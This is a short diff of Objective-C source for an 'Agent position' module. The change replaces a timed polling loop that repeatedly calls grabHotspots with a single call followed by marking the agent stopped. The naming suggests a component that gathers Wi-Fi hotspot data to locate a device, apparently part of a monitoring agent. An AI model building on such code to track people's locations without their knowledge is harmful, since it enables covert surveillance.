@@ -719,41 +719,13 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: Agent position started", __FUNCTION__);
-#endif
   
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
 
-  positionStruct *positionRawData;
-  positionRawData = (positionStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
-  u_int uSeconds = positionRawData->sleepTime * 1000;
-  
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: configuration %@ microsec %d, iTpye %lu", 
-        __FUNCTION__, mAgentConfiguration, uSeconds, positionRawData->iType);
-#endif
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-  {
-    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-  
-    // Bug on consolle: dont check type of logging
-    //if (positionRawData->iType == LOGGER_WIFI) 
-    [self grabHotspots];
-    
-    usleep(uSeconds);
-    
-    [innerPool release];
-  }
-  
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-  {
-    [mAgentConfiguration setObject: AGENT_STOPPED
-                            forKey: @"status"];
-  }
-  
+  [self grabHotspots];
+
+  [mAgentConfiguration setObject: AGENT_STOPPED
+                          forKey: @"status"];  
   [outerPool release];
 }
 
